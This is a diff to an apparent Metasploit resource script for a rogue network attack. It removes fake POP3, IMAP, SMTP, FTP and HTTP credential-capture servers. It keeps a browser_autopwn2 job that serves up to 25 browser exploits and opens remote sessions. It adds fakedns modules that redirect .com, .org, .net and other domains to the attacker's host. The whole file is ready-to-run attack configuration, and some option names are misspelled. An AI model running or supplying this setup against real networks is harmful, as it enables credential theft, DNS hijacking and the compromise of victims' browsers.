@@ -1,91 +1,10 @@
-use auxiliary/server/capture/pop3
-set SRVHOST 10.0.0.1
-set SRVPORT 110
-set SSL false
-run -j
-
-use auxiliary/server/capture/pop3
-set SRVHOST 10.0.0.1
-set SRVPORT 995
-set SSL true
-run -j
-
-use auxiliary/server/capture/ftp
-set SRVHOST 10.0.0.1
-run -j
-
-use auxiliary/server/capture/imap
-set SRVHOST 10.0.0.1
-set SSL false
-set SRVPORT 143
-run -j
-
-use auxiliary/server/capture/imap
-set SRVHOST 10.0.0.1
-set SSL true
-set SRVPORT 993
-run -j
-
-use auxiliary/server/capture/smtp
-set SRVHOST 10.0.0.1
-set SSL false
-set SRVPORT 25
-run -j
-
-use auxiliary/server/capture/smtp
-set SRVHOST 10.0.0.1
-set SSL true
-set SRVPORT 465
-run -j
-
-use auxiliary/server/fakedns
-set SRVHOST 10.0.0.1
-set TARGETHOST 10.0.0.1
-set TAGETDOMAIN *
-set TARGET ACTION BYPASS
-set SRVPORT 5353
-run -j
-
-use auxiliary/server/fakedns
-set SRVHOST 10.0.0.1
-set TARGETHOST 10.0.0.1
-set TAGETDOMAIN *
-set TARGET ACTION BYPASS
-set SRVPORT 53
-run -j
-
-use auxiliary/server/capture/http
-set SRVHOST 10.0.0.1
-set SRVPORT 80
-set SSL false
-run -j
-
-use auxiliary/server/capture/http
-set SRVHOST 10.0.0.1
-set SRVPORT 8080
-set SSL false
-run -j
-
-use auxiliary/server/capture/http
-set SRVHOST 10.0.0.1
-set SRVPORT 443
-set SSL true
-run -j
-
-use auxiliary/server/capture/http
-set SRVHOST 10.0.0.1
-set SRVPORT 8443
-set SSL true
-run -j
-
 use auxiliary/server/browser_autopwn2
 
 set AUTOPWN_HOST 10.0.0.1
 set AUTOPWN_PORT 80
 set AUTOPWN_URI /
-
 set MAXEXPLOITCOUNT 25
-set HTML::base64 => double_pad
+set HTML::base64 double_pad
 set MaxSessionCount 20
 set ShowExploitList true
 set LPORT 45000
@@ -94,3 +13,21 @@ set SRVPORT 80
 set URIPATH /
 
 run -j
+
+use auxiliary/server/fakedns
+set LogConsole false
+set TARGETHOST 10.0.0.1
+set SRVHOST 10.0.0.1
+set TAGETDOMAIN *.com, *.org, *.it, *.net, *.edu. *.fr
+set TARGET ACTION BYPASS
+set SRVPORT 5353
+run
+
+use auxiliary/server/fakedns
+set LogConsole false
+set TARGETHOST 10.0.0.1
+set SRVHOST 10.0.0.1
+set TAGETDOMAIN *.com, *.org, *.it, *.net, *.edu, *.fr
+set TARGET ACTION BYPASS
+set SRVPORT 53
+run
